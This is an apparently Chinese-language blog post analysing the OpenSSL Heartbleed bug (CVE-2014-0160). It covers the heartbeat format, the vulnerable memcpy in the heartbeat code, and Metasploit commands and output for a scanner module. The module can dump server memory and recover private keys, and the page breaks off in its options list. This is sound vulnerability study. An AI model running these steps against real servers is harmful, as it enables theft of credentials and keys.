<!DOCTYPE html><html lang="en, zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech"><meta name="author" content="7erry"><script>!function(){const e="dark";function t(t){const o=t===e,c=document.documentElement;c.setAttribute("data-theme",t),c.classList.add(t),c.classList.remove(o?"light":e),c.style.colorScheme=t}const o=function(){try{const t=localStorage.getItem("REDEFINE-THEME-STATUS");if(t){const{isDark:o}=JSON.parse(t);return o?e:"light"}}catch(e){}return matchMedia("(prefers-color-scheme: dark)").matches?e:"light"}();t(o),matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:o})=>{localStorage.getItem("REDEFINE-THEME-STATUS")||t(o?e:"light")}),"loading"!==document.readyState?document.body.classList.add(o+"-mode"):document.addEventListener("DOMContentLoaded",()=>{document.body.classList.add(o+"-mode"),document.body.classList.remove((o===e?"light":e)+"-mode")})}()</script><style>:root[data-theme=dark]{--background-color:#202124;--background-color-transparent:rgba(32, 33, 36, 0.6);--second-background-color:#2d2e32;--third-background-color:#34353a;--third-background-color-transparent:rgba(32, 33, 36, 0.6);--primary-color:#0066CC;--first-text-color:#ffffff;--second-text-color:#eeeeee;--third-text-color:#bebec6;--fourth-text-color:#999999;--default-text-color:#bebec6;--invert-text-color:#373D3F;--border-color:rgba(255, 255, 255, 0.08);--selection-color:#0066CC;--shadow-color-1:rgba(255, 255, 255, 0.08);--shadow-color-2:rgba(255, 255, 255, 0.05)}:root[data-theme=light]{--background-color:#fff;--background-color-transparent:rgba(255, 255, 255, 0.6);--second-background-color:#f8f8f8;--third-background-color:#f2f2f2;--third-background-color-transparent:rgba(241, 241, 241, 0.6);--primary-color:#0066CC;--first-text-color:#16171a;--second-text-color:#2f3037;--third-text-color:#5e5e5e;--fourth-text-color:#eeeeee;--default-text-color:#373D3F;--invert-text-color:#bebec6;--border-color:rgba(0, 0, 0, 0.08);--selection-color:#0066CC;--shadow-color-1:rgba(0, 0, 0, 0.08);--shadow-color-2:rgba(0, 0, 0, 0.05)}body{background-color:var(--background-color);color:var(--default-text-color)}:root[data-theme=dark] body{background-color:var(--background-color);color:var(--default-text-color)}</style><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://7erryX.github.io/2025/06/06/vulnerability investigation/cve-2014-0160-investigation/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"><meta property="og:type" content="article"><meta property="og:title" content="CVE-2014-0160 Investigation"><meta property="og:url" content="https://7erryx.github.io/2025/06/06/Vulnerability%20Investigation/CVE-2014-0160-Investigation/index.html"><meta property="og:site_name" content="7erry&#39;s Website"><meta property="og:description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"><meta property="og:locale"><meta property="og:image" content="https://7erryx.github.io/images/default_avatar.png"><meta property="article:published_time" content="2025-06-06T10:53:57.000Z"><meta property="article:modified_time" content="2025-06-06T10:53:57.000Z"><meta property="article:author" content="7erry"><meta property="article:tag" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://7erryx.github.io/images/default_avatar.png"><link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/favicon.ico"><title>CVE-2014-0160 Investigation | 7erry&#39;s Website</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/build/tailwind.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script src="/js/build/libs/anime.min.js"></script><script id="hexo-configurations">window.config={hostname:"7erryx.github.io",root:"/",language:"en, zh-CN",path:"search.json"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!1,title_alignment:"left",headings_top_spacing:{h1:"5rem",h2:"4rem",h3:"2.8rem",h4:"2.5rem",h5:"2.2rem",h6:"2rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!1,auto:!1,list:[]},code_block:{copy:!0,style:"simple",highlight_theme:{light:"github",dark:"github-dark"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,pangu_js:!1,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!0,custom_message:null},side_tools:{gear_rotation:!0,auto_expand:!1},open_graph:{enable:!0,image:"/images/default_avatar.png",description:"(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"},google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/background_light.jpg",dark:"/images/background_dark.jpg"},title:"7erry's Website",subtitle:{text:["君子慎独","君子不器","我的人生烷基八氮了","Fall in Love with the Problem, Not the Solution","Do The Right Thing，Do The Thing Right","Lux et veritas","Mens et Manus","Per Aspera Ad Astra","(v50) 経験に3を加えて，失礼します [中国翻訳] [無修正]","呐呐呐，你听说过二刺螈吗?","取势，明道，优术","做难而正确的事"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#000",dark:"#fff"},text_style:{title_size:"5.7rem",subtitle_size:"1.9rem",line_height:1.1},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/7erryX",instagram:null,zhihu:null,twitter:null,email:"w.7erry@qq.com",bilibili:"https://space.bilibili.com/25689965"},qrs:null}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!0,version:"9.3.0"}},version:"2.8.4",navbar:{auto_hide:!0,color:{left:"#7ab8cc",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-regular fa-archive"},Anime:{path:"/bangumis",icon:"fa-brands fa-youtube"},Cinema:{path:"/cinemas",icon:"fa-solid fa-film"},About:{path:"/about",icon:"fa-regular fa-user"}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"info",announcement:null,show_on_mobile:!0,links:{Archives:{path:"/archives",icon:"fa-regular fa-archive"},Categories:{path:"/categories",icon:"fa-regular fa-folder"}}},article_date_format:"auto",excerpt_length:200,categories:{enable:!0,limit:1},tags:{enable:!1,limit:3}},footerStart:"2020/2/2 20:20:22"},window.lang_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><style>:root{--preloader-background-color:#fff;--preloader-text-color:#000}@media (prefers-color-scheme:dark){:root{--preloader-background-color:#202124;--preloader-text-color:#fff}}@media (prefers-color-scheme:light){:root{--preloader-background-color:#fff;--preloader-text-color:#000}}@media (max-width:600px){.ml13{font-size:2.6rem!important}}.preloader{display:flex;flex-direction:column;gap:1rem;align-items:center;justify-content:center;position:fixed;padding:12px;top:0;right:0;bottom:0;left:0;width:100vw;height:100vh;background-color:var(--preloader-background-color);z-index:1100;transition:opacity .2s ease-in-out}.ml13{font-size:3.2rem;color:var(--preloader-text-color);letter-spacing:-1px;font-weight:500;font-family:Chillax-Variable,sans-serif;text-align:center}.ml13 .word{display:inline-flex;flex-wrap:wrap;white-space:nowrap}.ml13 .letter{display:inline-block;line-height:1em}</style><div class="preloader"><h2 class="ml13">7erry&#39;s Website</h2><script>var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }</script></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/"><img src="/images/favicon.ico" class="w-full h-full rounded-xs"> </a><a class="logo-title" href="/">7erry&#39;s Website</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> INICIO</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive fa-fw"></i> ARCHIVOS</a></li><li class="navbar-item"><a href="/bangumis"><i class="fa-brands fa-youtube fa-fw"></i> ANIME</a></li><li class="navbar-item"><a href="/cinemas"><i class="fa-solid fa-film fa-fw"></i> CINEMA</a></li><li class="navbar-item"><a href="/about"><i class="fa-regular fa-user fa-fw"></i> ACERCA DE</a></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>INICIO </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>ARCHIVOS </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/bangumis"><span>ANIME </span><i class="fa-brands fa-youtube fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/cinemas"><span>CINEMA </span><i class="fa-solid fa-film fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/about"><span>ACERCA DE </span><i class="fa-regular fa-user fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active" href="/categories"><span>Categories</span> <i class="fa-regular fa-folder fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">Etiquetas</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div><div class="label text-third-text-color text-sm">Categorías</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">76</div><div class="label text-third-text-color text-sm">Publicaciones</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2014-0160 Investigation</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/default_avatar.png"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">7erry</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2025-06-06 18:53:57</span> <span class="mobile">2025-06-06 18:53:57</span> <span class="hover-info">Creado</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2025-06-06 18:53:57</span> <span class="mobile">2025-06-06 18:53:57</span> <span class="hover-info">Actualizado</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/Vulnerability-Investigation/">Vulnerability Investigation</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>5.9k Palabras</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>33 Minutos</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><p>OpenSSL 是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及 SSL 协议。2014 年 4 月 7 日，OpenSSL 官方发布了一项安全公告，称 OpenSSL 的 HeartBeat 模块存在一处严重漏洞(CVE-2014-0160)，主要影响 OpenSSL 1.0.1~1.0.2beta1 测试版。问题出现在 ssl&#x2F;dl_both.c 中的 HeartBeat 部分，OpenSSL 1.0.1 中的 TLS 和 DTLS 在实现上没有严格处理 Heartbeat 扩展包，心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合（缺少边界检查）。攻击者可以通过构造恶意数据包导致服务端的 memcpy 函数把 SSLv3 记录之后的数据直接输出，进而允许攻击者远程读取存在漏洞版本的 OpenSSL 服务器内存中多达 64K 的数据，包括但不限于用户登录态的 Cookie 甚至是账号密码。由于 OpenSSL 的广泛使用，该漏洞危害范围之广，影响之巨令人咋舌，已经不仅是技术层面的缓冲区溢出 Bug，更暴露了互联网基础设施的脆弱和开源维护资源的匮乏，因而被冠名为 HeartBleed 漏洞后作为 2014 年最具破坏性的漏洞名列 2014 年十大安全事件之一，推动了从代码审计到政策制定的全方位变革，其漏洞 Logo （一颗破碎的心）成为网络安全警示标志。哪怕到了十余年后的今天，也仍是网络安全研究的经典案例，警醒着每一位安全从业人员</p><p>影响范围：</p><p>OpenSSL 1.0.1 before 1.0.1g</p><h2 id="Heart-Beat"><a href="#Heart-Beat" class="headerlink" title="Heart Beat"></a>Heart Beat</h2><p>Heartbleed 发生于 OpenSSL 的 HeartBeat（心跳）服务————「心跳」是一种常见的运维设计思想，即连接一端的计算机发出一条简短数据，协议另一端的计算机是否仍然在线，并获取反馈数据。由于这种用于运维的链接可能是周期性的，因此被称为心跳。心跳机制允许一个 TLS 对等体向另一个对等体发送一个心跳请求，接收方应以心跳响应形式回送相同的数据。具体流程如下：</p><ol><li>心跳请求：一方发送包含随机数据和请求类型的心跳请求消息。</li><li>心跳响应：接收方在接收到心跳请求后，必须在心跳响应消息中返回相同的随机数据。</li></ol><p>心跳包的格式为</p><table><thead><tr><th>心跳包字段</th><th>长度(byte)</th><th>说明</th></tr></thead><tbody><tr><td>ContentType</td><td>1</td><td>心跳包类型，IANA 组织把 type 编号定义为 24（0x18）</td></tr><tr><td>ProtocolVersion</td><td>2</td><td>TLS 的版本号，目前主要包括含有心跳扩展的 TLS 版本：TLSv1.0，TLSv1.1，TLSv1.2</td></tr><tr><td>length</td><td>2</td><td>HeartbeatMessage 的长度</td></tr><tr><td>HeartbeatMessageType</td><td>1</td><td>Heartbeat 类型 01 表示 heartbeat_request,02 表示 heartbeat_response</td></tr><tr><td>payload_length</td><td>2</td><td>payload 长度</td></tr><tr><td>payload</td><td>payload_length</td><td>payload 的具体内容</td></tr><tr><td>padding</td><td>&gt;&#x3D; 16</td><td>padding 填充，最少为 16 个字节</td></tr></tbody></table><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>OpenSSL 是开源项目，因此可以直接查看其 security patch 和源代码进行漏洞分析。注意到补丁主要修复了 ssl&#x2F;d1_both.c 中的 <code>dtls1_process_heartbeat(SSL *s)</code> 和 ssl&#x2F;t1_lib.c 中的 <code>tls1_process_heartbeat(SSL *s)</code> 函数。打开源码对这两个函数进行代码审计，以 <code>tls1_process_heartbeat(SSL *s)</code> 函数为例，其核心代码为</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">dtls1_process_heartbeat</span><span class="params">(SSL *s)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>]; <span class="comment">//* 接收到的心跳包的数据</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> payload; <span class="comment">//* paylood 长度</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></span><br><span class="line">    ...</span><br><span class="line">    hbtype = *p++; <span class="comment">//* 读取心跳包类型</span></span><br><span class="line">    n2s(p, payload); <span class="comment">//* 从心跳包数据中提取出 payload 长度</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *buffer, *bp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> write_length = <span class="number">1</span> <span class="comment">/* heartbeat type */</span> +</span><br><span class="line">                        <span class="number">2</span> <span class="comment">/* heartbeat length */</span> +</span><br><span class="line">                        payload + padding;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">/* Allocate memory for the response, size is 1 byte</span></span><br><span class="line"><span class="comment">         * message type, plus 2 bytes payload length, plus</span></span><br><span class="line"><span class="comment">         * payload, plus padding</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        buffer = OPENSSL_malloc(write_length); <span class="comment">//* 分配缓冲区</span></span><br><span class="line">        bp = buffer;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">memcpy</span>(bp, pl, payload); <span class="comment">//* Vul Point</span></span><br><span class="line">        ...</span><br><span class="line">        r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, write_length);</span><br><span class="line">        ...</span><br><span class="line">        OPENSSL_free(buffer);</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (hbtype == TLS1_HB_RESPONSE)</span><br><span class="line">        &#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>相关执行逻辑已标记在注释中。造成漏洞的代码为</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(bp, pl, payload); <span class="comment">//* Vul Point</span></span><br></pre></td></tr></table></figure></div><p>写入响应包的数据的大小 payload 取决于请求包的 payload 大小，因此若请求包声明的 payload 大小被伪造则将越越界读取内存数据造成信息泄露</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 MSF 搜索该漏洞的 exp</p><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; search cve-2014-0160</span><br></pre></td></tr></table></figure></div><p>搜索结果</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure</span><br><span class="line">   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak</span><br><span class="line">   2    \_ action: DUMP                                 .                .       .      Dump memory contents to loot</span><br><span class="line">   3    \_ action: KEYS                                 .                .       .      Recover private keys from memory</span><br><span class="line">   4    \_ action: SCAN                                 .                .       .      Check hosts for vulnerability</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/ssl/openssl_heartbleed</span><br><span class="line">After interacting with a module you can manually set a ACTION with set ACTION &#x27;SCAN&#x27;</span><br></pre></td></tr></table></figure></div><p>调用该模块并查看模块详情</p><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssl/openssl_heartbleed</span><br><span class="line">msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; info</span><br></pre></td></tr></table></figure></div><p>模块详情信息</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">       Name: OpenSSL Heartbeat (Heartbleed) Information Leak</span><br><span class="line">     Module: auxiliary/scanner/ssl/openssl_heartbleed</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line">  Disclosed: 2014-04-07</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Neel Mehta</span><br><span class="line">  Riku</span><br><span class="line">  Antti</span><br><span class="line">  Matti</span><br><span class="line">  Jared Stafford &lt;jspenguin@jspenguin.org&gt;</span><br><span class="line">  FiloSottile</span><br><span class="line">  Christian Mehlmauer &lt;FireFart@gmail.com&gt;</span><br><span class="line">  wvu &lt;wvu@metasploit.com&gt;</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line">  Sebastiano Di Paola</span><br><span class="line">  Tom Sellers</span><br><span class="line">  jjarmoc</span><br><span class="line">  Ben Buchanan</span><br><span class="line">  herself</span><br><span class="line"></span><br><span class="line">Available actions:</span><br><span class="line">    Name  Description</span><br><span class="line">    ----  -----------</span><br><span class="line">    DUMP  Dump memory contents to loot</span><br><span class="line">    KEYS  Recover private keys from memory</span><br><span class="line">=&gt;  SCAN  Check hosts for vulnerability</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name              Current Setting  Required  Description</span><br><span class="line">  ----              ---------------  --------  -----------</span><br><span class="line">  DUMPFILTER                         no        Pattern to filter leaked memory before storing</span><br><span class="line">  LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation</span><br><span class="line">  MAX_KEYTRIES      50               yes       Max tries to dump key</span><br><span class="line">  RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response</span><br><span class="line">  RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">  RPORT             443              yes       The target 